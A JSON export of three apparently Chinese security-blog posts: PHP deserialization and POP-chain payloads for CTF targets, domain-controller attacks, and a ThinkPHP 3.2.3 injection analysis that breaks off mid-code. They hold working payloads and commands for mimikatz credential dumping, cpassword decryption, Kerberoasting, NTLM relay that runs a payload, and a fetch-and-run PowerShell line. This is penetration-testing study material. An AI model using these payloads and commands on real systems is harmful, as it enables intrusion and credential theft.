[{"title":"php反序列化到pop链构造","url":"/2020/04/26/php反序列化到pop链构造/","content":"\n#### **序列化与反序列化**\n\n在php中，使用serialize和unserialize两个函数表示序列化与反序列化。\n\n```\nserialize：把一个对象转化成字节流的字符串，序列化的对象会保存类的属性，不会保存方法\nunserialize：把字节流字符串转化成一个对象\n```\n\n看下下面的列子，通过serialize序列化返回字符串\n\n```\n<?php\nclass A{\n    // 属性\n    public $name;\n    public $age;\n    public function __construct($name,$age){\n        $this->name = $name;\n        $this->age = $age;\n    }\n    // 方法\n    public function Skill(){\n        echo \"My name is \".$this->name.\",I am is \".$this->age.\" years old!<br>\";\n    }\n}\n$a = new A('fanxing','20');\necho serialize($a);\n?>\n```\n\n返回字节流的字符串\n\n```\nO:1:\"A\":2:{s:4:\"name\";s:7:\"fanxing\";s:3:\"age\";s:2:\"20\";}\n```\n\nO代表对象:长度:类的名字:类的属性个数:{类型:长度:属性名字;类型:长度:属性值;...}\n\n反序列化列子如下：\n\n```\n<?php\nclass A{\n    // 属性\n    public $name;\n    public $age;\n    public function __construct($name,$age){\n        $this->name = $name;\n        $this->age = $age;\n    }\n    // 方法\n    public function Skill(){\n        echo \"My name is \".$this->name.\",I am is \".$this->age.\" years old!<br>\";\n    }\n}\n$a = unserialize('O:1:\"A\":2:{s:4:\"name\";s:7:\"fanxing\";s:3:\"age\";s:2:\"20\";}');\n$a->Skill();\n?>\n```\n\n打印出Skill方法中的值\n\n```\nMy name is fanxing,I am is 20 years old!\n```\n\n#### **魔术方法**\n\n在学习php反序列漏洞前，都需要先了解php的魔术方法，常见的魔术方法如下：\n\n**__construct()**\t\n\n当一个对象被创建的时候调用该方法。\n\n**__destruct()**\n\n当一个对象被删除和销毁的时候调用。\n\n```\n<?php\nclass A{\n    public function __construct(){\n        echo \"对象创建调用.<br>\";\n    }\n    public function __destruct(){\n        echo \"对象销毁调用\";\n    }\n}\n$a = new A();\n?>\n```\n\n**__toString**\n\n当一个对象被当成字符串的时候进行调用。\n\n```\n<?php\nclass A{\n    public function __construct(){\n        echo \"对象创建调用.<br>\";\n    }\n    public function __toString(){\n        echo \"对象字符串调用\";\n        return \"1\";\n    }\n}\n$a = new A();\necho $a;\n?>\n```\n\n**__invoke**\n\n当一个对象以函数的方式进行调用的时候会被调用。\n\n```\n<?php\nclass A{\n    public function __construct(){\n        echo \"对象创建调用.<br>\";\n    }\n    public function __invoke(){\n        echo \"对象以函数调用\";\n    }\n}\n$a = new A();\n$a();\n?>\n```\n\n**__sleep**\n\n对象在使用serialize函数前会先调用，在执行序列化的操作。\n\n**__wakeup**\n\n对象在使用unserialize函数前会先调用，在执行反序列化的操作。\n\n```\n<?php\nclass A{\n    public function __construct(){\n        echo \"对象创建调用<br>\";\n    }\n    public function __sleep(){\n        echo \"序列化被调用<br>\";\n        return array();\n    }\n    public function __wakeup(){\n        echo \"反序列化被调用<br>\";\n    }\n}\n$a = new A();\n$s = serialize($a);\necho unserialize($s);\n?>\n```\n\n**__call**\n\n对象在调用不可访问的方法的时候触发\n\n**__callStatic**\n\n在静态中调用不可访问的方法的时候会触发\n\n**__set**\n\n给不可以访问的属性赋值被调用\n\n**__get**\n\n读取不可访问的属性值被调用\n\n**__isset**\n\n不可访问的属性调用为 isset() 或 empty()时被调用\n\n**__unset**\n\n对不可以访问的属性使用unset会被调用\n\n#### **对象注入**\n\n满足unserialize参数可控和类中存在魔法方法，并且存在危险函数既进行对象注入\n\n```\n<?php\nclass A{\n    private $name;\n    public function __construct(){\n        echo \"对象创建调用<br>\";\n    }\n    public function __destruct(){\n        eval($this->name);\n    }\n}\n$a = unserialize($_GET['a']);\n?>\n```\n\n这里我们打印下序列化结果，发现属性的长度是7。\n\n```\nO:1:\"A\":1:{s:7:\"Aname\";N;}\n```\n\n这里需要注意的是成员属性使用的是private属性，在使用private和protected属性时，会在类名前后添加%00，即2个字符，使用urlencode打印出来看看。\n\n```\nO%3A1%3A%22A%22%3A1%3A%7Bs%3A7%3A%22%00A%00name%22%3BN%3B%7D\n```\n\n同样，也可以加属性名前面添加\\00*\\00，构造下pyalod直接执行了任意代码\n\n```\nO%3A1%3A\"A\"%3A1%3A%7Bs%3A7%3A\"%00A%00name\"%3Bs%3A10%3A\"phpinfo%28)%3B\"%3B%7D\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/1.png)\n\n在举一个列子，这里使用__wakeup魔法方法来来绕过，涉及到一个CVE-2016-7124漏洞，该漏洞影响版本：\n\n```\nPHP5 < 5.6.25\nPHP7 < 7.0.10\n```\n\n举个列子\n\n```\n<?php\nclass A{\n    private $name='phpinfo();';\n    public function __wakeup(){\n        $this->name = 'phpinfo();';\n    }\n    public function __destruct(){\n        eval($this->name);\n    }\n}\n$a = unserialize($_GET['a']);\n?>\n```\n\n__wakeup会在反序列化之前执行，所以怎么样对象被销毁的时候都是要执行phpinfo的，那怎么绕过\n\n__wakeup呢？需要构造如下序列化对象：\n\n```\nO%3A1%3A\"A\"%3A2%3A%7Bs%3A7%3A\"%00A%00name\"%3Bs%3A17%3A\"system%28\"whoami\"%29%3B\"%3B%7D\n```\n\n这里对象的属性个数是1，我设置为大于1就绕过了__wakeup，所以当序列化的结果的对象属性大于本身类的对象属性就可以绕过wakeup魔术方法。\n\n![2](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/2.png)\n\n#### **Session反序列化**\n\nphp的session在存储和读取的时候，会进行序列化和反序列化，在php中有3种序列化的方式，当在php.ini中设置如下值：\n\n| session.serialize_handler | 存储方式                                                     |\n| ------------------------- | ------------------------------------------------------------ |\n| php                       | 键名+竖线+经过serialize序列化的字符串                        |\n| php_serialize             | serialize序列化的的值                                        |\n| php_binary                | 键名的长度对应的 ASCII 字符＋键名＋经过serialize()函数反序列处理的值 |\n\n举个列子\n\n```\n<?php\nini_set('session.serialize_handler','php');\nsession_start();\n$_SESSION['name'] = 'fanxing';\n?>\n```\n\n当session.serialize_handler为php的时候，存储的session结果为\n\n```\nname|s:7:\"fanxing\";\n```\n\n当session.serialize_handler为php_serialize的时候，存储的session结果为\n\n```\na:1:{s:4:\"name\";s:7:\"fanxing\";}\n```\n\n当session.serialize_handler为php_binary的时候，存储的session结果为\n\n```\n二进制字符串names:7:\"fanxing\"\n```\n\nphp大于5.5.4的版本默认使用的是php_serialize。\n\n在php.ini中，还要了解一些关于session的配置：\n\nsession.save_path\tsession保存的路径\n\nsession.upload_progress.cleanup\t上传完成后(POST)会立即删除进度，默认开启\n\nsession.upload_progress.enabled\t将上传的进度存于session，默认开启\n\n```\n当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。\n\n当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。\n```\n\n这里利用CTF的一道题目：http://web.jarvisoj.com:32784/index.php\n\n```\n<?php\n//A webshell is wait for you\nini_set('session.serialize_handler', 'php');\nsession_start();\nclass OowoO\n{\n    public $mdzz;\n    function __construct()\n    {\n        $this->mdzz = 'phpinfo();';\n    }\n\n    function __destruct()\n    {\n        eval($this->mdzz);\n    }\n}\nif(isset($_GET['phpinfo']))\n{\n    $m = new OowoO();\n}\nelse\n{\n    highlight_string(file_get_contents('sessiontest.php'));\n}\n?>\n```\n\n可以看到题目使用的是php5.6.21，默认使用的是php_serialize，而题目使用的是php，所以可以利用session.upload_progress.enabled来构造session。\n\n```\n<form action=\"http://web.jarvisoj.com:32784/index.php\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name=\"<?php echo ini_get(\"session.upload_progress.name\"); ?>\" value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" />\n</form>\n```\n\n构造payload\n\n```\n<?php\nclass OowoO\n{\n    public $mdzz='print_r(dirname(__FILE__));';\n}\n$b = new OowoO();\n$a = serialize($b);\necho $a;\n?>\n```\n\n在filename处提交payload：|O:5:\\\"OowoO\\\":1:{s:4:\\\"mdzz\\\";s:27:\\\"print_r(dirname(__FILE__));\\\";}\n\n![3](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/3.png)\n\n之后就可以构造payload读取本地的文件，具体可以参考[先知twosmi1e师傅](https://xz.aliyun.com/t/3674#toc-9)和博客[Mochazz师傅的文章](https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80)。\n\n#### **POP链构造**\n\n在反序列化攻击中，一般都要寻找魔术方法中的一些敏感函数来触发漏洞，当魔法方法中不存在敏感函数时，需要构造pop链寻找相同函数将类的属性和敏感函数联系到一起。\n\n这里，参考了这位[师傅](http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/)的题目，题目部分代码我删了下，看原题可以去连接看这位师傅的。\n\n```\n<?php\nclass OutputFilter {\n    protected $matchPattern;\n    protected $replacement;\n    function __construct($pattern, $repl) {\n        $this->matchPattern = $pattern;\n        $this->replacement = $repl;\n    }\n    function filter($data) {\n        return preg_replace($this->matchPattern, $this->replacement, $data);\n    }\n};\nclass LogFileFormat {\n    protected $filters;\n    protected $endl;\n    function __construct($filters, $endl) {\n        $this->filters = $filters;\n        $this->endl = $endl;\n    }\n    function format($txt) {\n        foreach ($this->filters as $filter) {\n            $txt = $filter->filter($txt);\n        }\n        $txt = str_replace('\\n', $this->endl, $txt);\n        return $txt;\n    }\n};\nclass LogWriter_File {\n    protected $filename;\n    protected $format;\n    function __construct($filename, $format) {\n        $this->filename = str_replace(\"..\", \"__\", str_replace(\"/\", \"_\", $filename));\n        $this->format = $format;\n    }\n    function writeLog($txt) {\n        $txt = $this->format->format($txt);\n        //TODO: Modify the address here, and delete this TODO.\n        file_put_contents(\"D:\\\\phpStudy\\\\WWW\\\\ctf\" . $this->filename, $txt, FILE_APPEND);\n    }\n};\nclass Logger {\n    protected $logwriter;//这里装入LogWriter_File对象\n    function __construct($writer) {\n        $this->logwriter = $writer;\n    }\n    function log($txt) {//这里偷梁换柱Song的log\n        $this->logwriter->writeLog($txt);\n    }\n};\nclass Song {\n    protected $logger;\n    protected $name;\n    protected $group;\n    protected $url;\n    function __construct($name, $group, $url) {\n        $this->name = $name;\n        $this->group = $group;\n        $this->url = $url;\n        $fltr = new OutputFilter(\"/\\[i\\](.*)\\[\\/i\\]/i\", \"<i>\\\\1</i>\");\n        $this->logger = new Logger(new LogWriter_File(\"song_views\", new LogFileFormat(array($fltr), \"\\n\")));\n    }\n    function __toString() {\n        return \"<a href='\" . $this->url . \"'><i>\" . $this->name . \"</i></a> by \" . $this->group;\n    }\n    function log() {\n        $this->logger->log(\"Song \" . $this->name . \" by [i]\" . $this->group . \"[/i] viewed.\\n\");\n    }\n    function get_name() {\n        return $this->name;\n    }\n}\nclass Lyrics {\n    protected $lyrics;\n    protected $song;\n    function __construct($lyrics, $song) {\n        $this->song = $song;\n        $this->lyrics = $lyrics;\n    }\n    function __toString() {\n        return \"<p>\" . $this->song->__toString() . \"</p><p>\" . str_replace(\"\\n\", \"<br />\", $this->lyrics) . \"</p>\\n\";\n    }\n    function __destruct() {\n        $this->song->log();\n    }\n    function shortForm() {\n        return \"<p><a href='song.php?name=\" . urlencode($this->song->get_name()) . \"'>\" . $this->song->get_name() . \"</a></p>\";\n    }\n    function name_is($name) {\n        return $this->song->get_name() === $name;\n    }\n};\nclass User {\n    static function addLyrics($lyrics) {\n        $oldlyrics = array();\n        if (isset($_COOKIE['lyrics'])) {\n            $oldlyrics = unserialize(base64_decode($_COOKIE['lyrics']));\n        }\n        foreach ($lyrics as $lyric) $oldlyrics []= $lyric;\n        setcookie('lyrics', base64_encode(serialize($oldlyrics)));\n    }\n    static function getLyrics() {\n        if (isset($_COOKIE['lyrics'])) {\n            return unserialize(base64_decode($_COOKIE['lyrics']));\n        }\n        else {\n            setcookie('lyrics', base64_encode(serialize(array(1, 2))));\n            return array(1, 2);\n        }\n    }\n};\n\nUser::getLyrics();\n```\n\n在进行反序列化漏洞的时候，我们需要找到可控的unserialize，这里发现$_COOKIE['lyrics']参数可控，有了可控的参数，就需要找到魔术方法来自动调用，这里危险函数在LogWriter_File这个类，这时就需要构造POP链了。\n\n首先来看魔术方法，在Lyrics类中存在两个魔术方法，发现对象在销毁的时候调用了$this->song->log()，而log方法又在Logger这个类中存在，所以属性$this->song应该为new Logger()。\n\n```\nclass Lyrics {\n    protected $lyrics;\n    protected $song;\n    function __construct() {\n        $this->song = new Logger();\n        $this->lyrics = '111';\n    }\n    function __toString() {\n        return \"<p>\" . $this->song->__toString() . \"</p><p>\" . str_replace(\"\\n\", \"<br />\", $this->lyrics) . \"</p>\\n\";\n    }\n    function __destruct() {\n        $this->song->log();\n    }\n    function shortForm() {\n        return \"<p><a href='song.php?name=\" . urlencode($this->song->get_name()) . \"'>\" . $this->song->get_name() . \"</a></p>\";\n    }\n    function name_is($name) {\n        return $this->song->get_name() === $name;\n    }\n};\n```\n\n继续找，当实例化对象Lyricsde时，log方法存在$this->logwriter->writeLog，而writeLog又存在于LogWriter_File类中，这好这个类是我们的漏洞触发点，所以$this->logwriter应该为new LogWriter_Fil()，构造下payload：\n\n```\nclass Logger {\n    protected $logwriter;\n    function __construct() {\n        $this->logwriter = new LogWriter_File('123.php');\n    }\n    function log($txt) {\n        $this->logwriter->writeLog($txt);\n    }\n};\n```\n\n实例化对象Logger之后，调用了LogWriter_File的writeLog方法，而写入文件的txt是通过$this->format->format获得，而format方法存在类LogFileFormat中，所以，构造如下payload：\n\n```\nclass LogWriter_File {\n    protected $filename;\n    protected $format;\n    function __construct($filename) {\n        $this->filename = str_replace(\"..\", \"__\", str_replace(\"/\", \"_\", $filename));\n        $this->format = new LogFileFormat();\n    }\n    function writeLog($txt) { // 111\n        $txt = $this->format->format($txt);\n        //TODO: Modify the address here, and delete this TODO.\n        file_put_contents(\"D:\\\\phpStudy\\\\WWW\\\\ctf\" . $this->filename, $txt, FILE_APPEND);\n    }\n};\n```\n\n在类LogFileFormat中的format方法中利用$filter->filter来获取的$txt，而$filter是通过foreach获取的，所以$this->filters为一个数组，最终OutputFilter传入写入文件的内容，就可以构造如下payload：\n\n```\nclass OutputFilter {\n    protected $matchPattern;\n    protected $replacement;\n    function __construct() {\n        $this->matchPattern = '//';\n        $this->replacement = '<?= `whoami`?>';\n    }\n    function filter($data) {\n        return preg_replace($this->matchPattern, $this->replacement, $data);\n    }\n};\n\nclass LogFileFormat {\n    protected $filters;\n    protected $endl;\n    function __construct() {\n        $this->filters = array(new OutputFilter());\n        $this->endl = '';\n    }\n    function format($txt) { // 111\n        foreach ($this->filters as $filter) {\n            $txt = $filter->filter($txt);\n            echo $txt;\n        }\n        $txt = str_replace('\\n', $this->endl, $txt);\n        return $txt;\n    }\n};\n```\n\n最后，将payload组合起来，利用serialize输出下序列化的结果\n\n![4](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/4.png)\n\n```\nO%3A6%3A%22Lyrics%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00lyrics%22%3Bs%3A3%3A%22111%22%3Bs%3A7%3A%22%00%2A%00song%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00logwriter%22%3BO%3A14%3A%22LogWriter_File%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A7%3A%22123.php%22%3Bs%3A9%3A%22%00%2A%00format%22%3BO%3A13%3A%22LogFileFormat%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22OutputFilter%22%3A2%3A%7Bs%3A15%3A%22%00%2A%00matchPattern%22%3Bs%3A2%3A%22%2F%2F%22%3Bs%3A14%3A%22%00%2A%00replacement%22%3Bs%3A14%3A%22%3C%3F%3D+%60whoami%60%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00endl%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D\n```\n\n在base64下通过cookie传入就可以写入ctf123.php了\n\n![5](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/5.png)\n\n#### **参考文章**\n\n1.http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/\n\n2.https://xz.aliyun.com/t/3674#toc-9\n\n3.https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80","tags":["代码审计"]},{"title":"获取域控的方法","url":"/2020/02/26/获取域控的方法/","content":"\n#### **高权限读取本地密码**\n\n当域管理员在域成员机器上登录进行工作的时候，会将明文密码保存在本地进行的lsass.exe，可以通过mimikatz来读取到本地的明文密码。\n\n```\nprivilege::debug  # 提权\nsekurlsa::logonpasswords\n```\n\n如果主机存在杀软的时候，上传mimikatz很多时候都会被杀掉，可以通过[procdump](https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump)+mimikatz的方式进行绕过。先导出lsass.exe\n\n```\nprocdump64.exe -accepteula -ma lsass.exe lsass.dmp\n```\n\n保存到本地，通过mimikatz读lsass.dmp的明文\n\n```\nmimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\"  > 1.txt\n```\n\n如果目标机器是windows server 2012，通过添加注册表，在通过锁屏，让管理员重新登录及可以读取明文。\n\n添加注册表，设置UseLogonCredential设置为1\n\n```\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n```\n\n利用powershell脚本进行锁屏\n\n```\nFunction Lock-WorkStation \n{\n$signature = @\"\n[DllImport(\"user32.dll\", SetLastError = true)]\npublic static extern bool LockWorkStation();\n\"@\n$LockWorkStation = Add-Type -memberDefinition $signature -name \"Win32LockWorkStation\" -namespace Win32Functions -passthru\n$LockWorkStation::LockWorkStation() | Out-Null\n}\nLock-WorkStation\n```\n\n管理员重新登录后就可以抓取到明文密码了。\n\n#### **SYSVOL还原组策略**\n\n在域环境中，有个默认的共享路径\n\n```\n\\\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\\n```\n\nSYSVOL是活动目录存储文件服务副本的共享文件夹，里面包含有登录脚本，组策略数据等，域里的所有用户都能访问这个共享文件。在SYSVOL目录下，默认是没有groups.xml文件的，必须创建组策略脚本登录才有这个文件。在groups.xml文件中，密码是通过AES-256加密的，但是微软发布了AES的[私钥](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)。\n\n可以利用powershell解密密文:\n\n```powershell\nfunction Get-DecryptedCpassword {\n    [CmdletBinding()]\n    Param (\n        [string] $Cpassword\n    )\n \n    try {\n        #Append appropriate padding based on string length  \n        $Mod = ($Cpassword.length % 4)\n \n        switch ($Mod) {\n        '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}\n        '2' {$Cpassword += ('=' * (4 - $Mod))}\n        '3' {$Cpassword += ('=' * (4 - $Mod))}\n        }\n \n        $Base64Decoded = [Convert]::FromBase64String($Cpassword)\n \n        #Create a new AES .NET Crypto Object\n        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider\n        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,\n                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)\n \n        #Set IV to all nulls to prevent dynamic generation of IV value\n        $AesIV = New-Object Byte[]($AesObject.IV.Length) \n        $AesObject.IV = $AesIV\n        $AesObject.Key = $AesKey\n        $DecryptorObject = $AesObject.CreateDecryptor() \n        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)\n \n        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)\n    }\n \n    catch {Write-Error $Error[0]}\n}\nGet-DecryptedCpassword \"I0vK3Yj0SeoHQDxF5skcjt3BOkMZmX6IiqRVKCTo4Z4\"\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/1.png)\n\n针对SYSOVL的防御：\n\n```\n1.打补丁KB2962486\n2.删除SYSVOL目录下的groups.xml\n3.设置共享文件SYSVOL的权限\n```\n\n#### **Kerberoasting**\n\nSPN为服务主体名称，是服务实列(MSSQL,HTTP等)的唯一标识，如果在林中安装服务的多个实列，每个实列都有自己的SPN，如果kerberos服务票证的加密类型为RC4_HMAC_MD5，就可以导出TGS对其进行离线破解，获取到域用户的密码了。\n\n使用setspn查询spn(windows7和server2008默认自带)\n\n查询域内所有的SPN和查询test域的SPN\n\n```\nsetspn.exe -q */*\nsetspn.exe -T test.com -q */*\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/2.png)\n\n以CN开头的为代表一个账号，机器账号为Computers，域用户账号为Users\n\n查询域内注册的spn（kerberoast）\n\n```\ncscript GetUserSPNs.vbs\n```\n\nPowerView\n\nhttps://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1\n\n```\nGet-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon\n```\n\n给MSSQL服务注册SPN\n\n```\nsetspn.exe -A MSSQLSvc/WIN-M34UCFJIPNQ.test.com test.com\\fanxing\n```\n\n将kerberos的加密方式换成RC4_HMAC_MD5\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/3.png)\n\n请求指定的TGS，完成之后klist就能查看相应的票据\n\n```\n$SPNName = 'MSSQLSvc/WIN-M34UCFJIPNQ.test.com'\nAdd-Type -AssemblyNAme System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/4.png)\n\nmimikatz导出票据\n\n```\nkerberos::list /export\n```\n\n使用[tgsrepcrack.py](https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py)破解\n\n```\npython tgsrepcrack.py wordlist.txt mssql.kirbi\n```\n\n**kerberoasting后门利用**\n\n在获取到spn的修改权限后，可以给指定的域用户注册spn，可以获取到任意域用户的TGS进行离线破解\n\n```\nsetspn.exe -U -A VNC/WIN-M34UCFJIPNQ.test.com Administrator\n```\n\n#### **重放攻击**\n\n在NTML认证的过程中，数据包传递的是NTML-Hash加密的16位的challenge随机数得到的Net-NTML\n\n Hash，如果存在中间人的情况，就可以通过hash进行重放攻击，下面简述下存在中间人，NTML协议过程：\n\n![](https://p1.ssl.qhimg.com/t01f22f78b71df16680.png)\n\n```\n1.当客户端对服务端发起请求，客户端并不知道中间人存在，所以把请求发送给了中间人。中间人拿着这个请求发送给服务端，服务端以为是客户端发来的请求。\n2.进过验证后，会生成一个随机数(challenge)返回给攻击者，服务端保存的ntmlhash进行DES加密challenge(chal\nlenge1)，攻击者拿着这个challenge明文发送给客户端。\n3.客户端对这个challenge用自己的密码进行DES加密(response)，发送给中间人，中间人在将这个请求发送给服务端。\n4.服务端拿到这个response跟之前加密的challenge1进行对比，一样的话就验证成功。\n```\n\n在进行ntml中间人攻击的时候，要避免最小的网络流量，所以使用的比较多的也是LLMNR/NetNS欺骗。\n\n在两台windows进行进行资源请求的时候，对机器的解析顺序为：\n\n```\n1.HOSTS文件(c:/windows/system32/driver/etc/hosts)\n2.本地的DNS缓存(ipconfig /displaydns)\n3.dns服务器\n4.LLMNR\n5.NetBios-NS\n```\n\n##### SMB中继\n\n对于smb中继的利用条件：\n\n```\n1.不能开启smb签名，而在域内，域控上面是开启了签名的，域成员机器是没有开启的。\n2.打了ms08-068补丁的xp/2003系统也无法利用\n```\n\n首先利用nmap探测是否开启了签名\n\n```\nnmap -sT -p 445 --open --script smb-security-mode,smb-os-discovery 192.168.50.241\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/5.png)\n\n##### Responder+ntmlrelayx\n\n获取ntmlv2 hash，在攻击机执行\n\n```\npython Responder.py -I eth0 -v      #假设ip为192.168.50.64\n```\n\n在任意机器上执行\n\n```\ndir \\\\192.168.50.64\\c$\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/6.png)\n\n当使用ntmlrelayx进行重放攻击的时候，需要在Responder.conf设置SMB和HTTP服务为Off\n\n```\npython Responder.py -I eth0 -v    # 启动Responder，假设ip为192.168.50.64\npython ntlmrelayx.py -t 192.168.50.241   # -t为受害者，进行中继攻击\nnet use192.168.50.64\\c$ \"fx@123.com\" /user:\"administrator\"   # 攻击机执行\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/7.png)\n\n##### smbrelayx\n\n使用smbrelayx和ntmlrelayx都是利用的[impacket](https://github.com/CoreSecurity/impacket.git)，环境配置\n\n```\npip install pycrypto    # 安装加密库\napt-get --reinstall install python-pyasn1 python-pyasn1-modules\ncd impacket/\npython setup.py install\n```\n\n在攻击机进行重放攻击\n\n```\n# -h为指定受害者，-e在进行重放攻击后，在受害者机器执行exe\npython smbrelayx.py -h 192.168.50.241 -e /root/shell.exe \n```\n\n在内网其他目标机器执行\n\n```\nnet use192.168.50.64\\c$ \"fx@123.com\" /user:\"administrator\"\n```\n\n在msf上成功获取到meterpreter\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/8.png)\n\n##### Windows平台的重放攻击\n\n在windows下，可以利用powershell编写的[Inveigh](https://github.com/Kevin-Robertson/Inveigh)工具\n\n```\npowershell \"IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1');Invoke-Inveigh -consoleoutput Y FileOutput Y\"\n```\n\n在其他主机上执行\n\n```\ndir \\\\192.168.50.242\\c$   或者在开启HTTP，利用<img>来加载图片\n<img src=\"\\\\192.168.50.242\\1.png\">    在通过HTTP协议访问就行了\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/9.png)\n\n注意：在获取权限的那台机器，需要关闭windows防火墙，不是一直获取到challenge。","tags":["内网渗透"]},{"title":"ThinkPHP3.2.3 注入分析","url":"/2020/02/24/ThinkPHP3.2.3 漏洞分析/","content":"\n#### **where注入**\n\n在控制器中，写个demo，利用字符串方式作为where传参时存在注入\n\n```php\npublic function  getuser(){\n    $user = M('User')->where('id='.I('id'))->find();\n    dump($user);\n}\n```\n\n在变量user地方进行断点，PHPSTROM F7进入，I方法获取传入的参数\n\n```php\nswitch(strtolower($method)) {\n        case 'get'     :   \n        \t$input =& $_GET;\n        \tbreak;\n        case 'post'    :   \n        \t$input =& $_POST;\n        \tbreak;\n        case 'put'     :   \n        \tif(is_null($_PUT)){\n            \tparse_str(file_get_contents('php://input'), $_PUT);\n        \t}\n        \t$input \t=\t$_PUT;        \n        \tbreak;\n        case 'param'   :\n            switch($_SERVER['REQUEST_METHOD']) {\n                case 'POST':\n                    $input  =  $_POST;\n                    break;\n                case 'PUT':\n                \tif(is_null($_PUT)){\n                    \tparse_str(file_get_contents('php://input'), $_PUT);\n                \t}\n                \t$input \t=\t$_PUT;\n                    break;\n                default:\n                    $input  =  $_GET;\n            }\n            break;\n ......\n```\n\n重点看过滤函数\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/1.jpg)\n\n先利用htmlspecialchars函数过滤参数，在402行利用think_filter函数过滤常规sql函数\n\n```php\nfunction think_filter(&$value){\n\t// TODO 其他安全过滤\n\n\t// 过滤查询特殊字符\n    if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value)){\n        $value .= ' ';\n    }\n}\n```\n\n在where方法中，将$where的值放入到options[\"where\"]数组中\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/2.png)\n\n继续跟进查看find方法，第748行\n\n```php\n$options     =   $this->_parseOptions($options);\n```\n\n在数组$options中增加'table'=>'tp_user'，'model'=>'User'，随后F7跟进select方法\n\n```php\npublic function select($options=array()) {\n        $this->model  =   $options['model'];\n        $this->parseBind(!empty($options['bind'])?$options['bind']:array());\n        $sql    = $this->buildSelectSql($options);\n        $result   = $this->query($sql,!empty($options['fetch_sql']) ? true : false);\n        return $result;\n}\n```\n\n跟进buildSelectSql方法，继续在跟进parseSql方法，这里可以看到生成完整的sql语句\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/3.png)\n\n这里主要查看parseWhere方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/4.png)\n\n跟进parseThinkWhere方法\n\n```php\nprotected function parseThinkWhere($key,$val) {\n        $whereStr   = '';\n        switch($key) {\n            case '_string':\n                // 字符串模式查询条件\n                $whereStr = $val;\n                break;\n            case '_complex':\n                // 复合查询条件\n                $whereStr = substr($this->parseWhere($val),6);\n                